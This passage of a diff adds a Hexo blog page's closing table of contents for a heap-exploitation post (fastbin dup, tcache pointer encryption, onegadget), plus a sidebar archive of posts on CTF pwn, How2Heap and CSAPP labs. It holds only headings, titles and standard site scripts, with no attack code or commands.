href="#%E5%A0%86%E5%9D%97%E7%9A%84%E6%93%8D%E4%BD%9C%EF%BC%9F"><span class="toc-number">3.5.</span> <span class="toc-text">堆块的操作？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E2%80%94%E2%80%94tcache%E5%92%8Cfastbin%E6%8C%87%E9%92%88%E5%8A%A0%E5%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">泄露——tcache和fastbin指针加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup"><span class="toc-number">4.2.</span> <span class="toc-text">fastbin dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E4%BB%BB%E6%84%8F%E5%80%BC%E2%80%A6%E7%BB%93%E6%9D%9F%E4%BA%86%E5%90%97%EF%BC%9F"><span class="toc-number">4.3.</span> <span class="toc-text">一次任意地址写任意值…结束了吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#onegadget"><span class="toc-number">4.4.</span> <span class="toc-text">onegadget..?</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 34
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span>
+            <a class="archive-post-title" href="/2024/09/05/How2Heap-Protobuf%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024EzBuf/">How2Heap&Protobuf实战——CISCN2024EzBuf</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span>
+            <a class="archive-post-title" href="/2024/09/03/GO-rust%E7%AD%89%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%9A%84%E9%80%86%E5%90%91/">GO,rust等其他语言的逆向</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span>
+            <a class="archive-post-title" href="/2024/09/03/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%9D%E6%8E%A2/">虚拟机初探</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/30</span>
+            <a class="archive-post-title" href="/2024/08/30/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024-EzHeap/">How2Heap实战(2)——CISCN2024EzHeap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span>
+            <a class="archive-post-title" href="/2024/08/05/sandbox/">Sandbox  简单介绍</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2024/07/31/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84Kernel-Pwn/">从0开始的Kernel Pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span>
+            <a class="archive-post-title" href="/2024/07/28/How2Heap-8%E2%80%94%E2%80%94Tcache/">How2Heap(8)——Tcache</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span>
+            <a class="archive-post-title" href="/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack/">How2Heap(7)——Large Bin Attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/22</span>
+            <a class="archive-post-title" href="/2024/07/22/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/">How2Heap总集篇导演剪辑剧场版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2024/07/18/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024/">How2Heap实战(1)——CISCN2024orange_cat_diary</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span>
+            <a class="archive-post-title" href="/2024/07/11/CSAPP-Labs%E2%80%94%E2%80%94Malloc-Lab/">CSAPP Labs——Malloc Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span>
+            <a class="archive-post-title" href="/2024/07/04/CSAPP-Labs%E2%80%94%E2%80%94Attack-Lab/">CSAPP Labs——Attack Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span>
+            <a class="archive-post-title" href="/2024/06/06/CSAPP-Labs%E2%80%94%E2%80%94Bomb-Lab/">CSAPP Labs——Bomb Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span>
+            <a class="archive-post-title" href="/2024/06/05/CSAPP-Labs%E2%80%94%E2%80%94Data-Lab/">CSAPP Labs——Data Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span>
+            <a class="archive-post-title" href="/2024/05/13/%E7%94%B5%E8%84%91%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%95%B4%E7%90%86/">电脑问题解决方案整理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2024/04/17/How2Heap-6/">How2Heap(6)——House of Roman & House of Rabbit</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2024/04/06/%E5%88%86%E4%BA%AB%E4%BC%9A/">分享会</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span>
+            <a class="archive-post-title" href="/2024/03/23/%E6%A0%88%E6%BA%A2%E5%87%BAROP%E7%86%9F%E7%BB%83%E5%BA%A6%E6%8F%90%E5%8D%87tips/">栈溢出ROP熟练度提升总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span>
+            <a class="archive-post-title" href="/2024/02/05/Rust-Rust-3/">Rust？Rust！(3)——自用整合终极版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span>
+            <a class="archive-post-title" href="/2024/01/25/How2Heap-5/">How2Heap(5)——Unsorted bin attack & House of Lore</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span>
+            <a class="archive-post-title" href="/2024/01/23/%E5%93%88%E5%B7%A5%E5%A4%A7%E9%9D%92%E8%AE%AD%E8%90%A5%E8%AE%B0%E5%BD%95%E6%95%B4%E5%90%88%E5%8C%85/">青训营记录整合包</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span>
+            <a class="archive-post-title" href="/2024/01/22/IO-FILE/">IO_FILE——File Stream Oriented Programming (1)</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span>
+            <a class="archive-post-title" href="/2023/12/30/How2Heap-4/">How2Heap(4)——House of Orange & House of Einhejar</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span>
+            <a class="archive-post-title" href="/2023/12/27/ubuntu16-04-docker-%E5%AE%89%E8%A3%85pwndbg%E8%B8%A9%E5%9D%91%E5%A4%A7%E5%85%A8/">ubuntu16.04 docker环境踩坑</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span>
+            <a class="archive-post-title" href="/2023/12/26/Rust-Rust-2/">Rust？Rust！(2)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span>
+            <a class="archive-post-title" href="/2023/12/17/How2Heap-3/">How2Heap(3)—House of Force & House of Gods.</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span>
+            <a class="archive-post-title" href="/2023/12/14/Rust%EF%BC%9FRust%EF%BC%81-1/">Rust？Rust！(1)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span>
+            <a class="archive-post-title" href="/2023/12/03/How2Heap-2/">How2Heap(2)-Overlapping</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">linux杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/%E9%80%86%E5%90%91%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">逆向杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2023/11/09/How2Heap-1/">How2Heap(1)-fastbin（完整版）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span>
+            <a class="archive-post-title" href="/2023/11/06/%E5%AF%B9%E8%B7%B3%E8%A1%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E9%9D%99%E6%80%81%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/">对跳表机制及其静态逆向的一些想法</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/pwntools%E7%9A%84shellcode%E9%80%BB%E8%BE%91%E8%AF%A6%E8%A7%A3/">pwntools的shellcode逻辑详解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/my-first-blog/">my_first_blog</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="CSAPP">
+                <span class="iconfont-archer">&#xe606;</span>
+                CSAPP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Lab">
+                <span class="iconfont-archer">&#xe606;</span>
+                Lab
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                Develop
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="heap">
+                <span class="iconfont-archer">&#xe606;</span>
+                heap
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="wp">
+                <span class="iconfont-archer">&#xe606;</span>
+                wp
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="protobuf">
+                <span class="iconfont-archer">&#xe606;</span>
+                protobuf
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="FSOP">
+                <span class="iconfont-archer">&#xe606;</span>
+                FSOP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Rust">
+                <span class="iconfont-archer">&#xe606;</span>
+                Rust
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="shellcode">
+                <span class="iconfont-archer">&#xe606;</span>
+                shellcode
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Others">
+                <span class="iconfont-archer">&#xe606;</span>
+                Others
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="linux">
+                <span class="iconfont-archer">&#xe606;</span>
+                linux
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ROP">
+                <span class="iconfont-archer">&#xe606;</span>
+                ROP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="IDA">
+                <span class="iconfont-archer">&#xe606;</span>
+                IDA
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="编译">
+                <span class="iconfont-archer">&#xe606;</span>
+                编译
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="vm">
+                <span class="iconfont-archer">&#xe606;</span>
+                vm
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="CSAPP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            CSAPP
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Develop">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Develop
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="linux">
+            <span class="iconfont-archer">&#xe60a;</span>
+            linux
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="others">
+            <span class="iconfont-archer">&#xe60a;</span>
+            others
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Reverse">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Reverse
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
